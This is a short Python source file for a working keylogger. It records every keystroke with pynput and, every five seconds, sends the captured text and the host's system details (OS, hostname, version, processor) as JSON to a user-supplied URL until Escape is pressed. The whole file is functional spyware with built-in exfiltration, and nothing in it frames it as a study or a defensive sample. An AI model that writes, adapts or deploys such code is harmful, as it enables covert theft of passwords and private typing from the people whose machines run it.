from pynput import keyboard
import requests
import json
import threading
import platform
import ui

my_sys = platform.uname()
text = ""
time = 5
url=''
stop_event = threading.Event()
def post_req():
    try :
        if stop_event.is_set() == True:
            print("Process Stoping")
            return
        headers = {
            'Content-type' : 'application/json'
        }
        payload = json.dumps({
            'keyData':text,
            'System' : my_sys.system,
            'Name'   : my_sys.node,
            'Release': my_sys.release,
            'Version': my_sys.version,
            'Machine': my_sys.machine,
            'Processor': my_sys.processor
            
            })
        requests.post(url=url,headers=headers,data=payload)
        timer = threading.Timer(time,post_req)
        timer.start()   
    except :
        timer = threading.Timer(time,post_req)
        timer.start()
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        print("Exiting....")
        stop_event.set()
        return False
    else:
        text += str(key).strip("'")
if __name__ == '__main__': 
    url = ui.get_input()
    with keyboard.Listener(on_press=on_press) as listener:
        post_req()
        listener.join()
    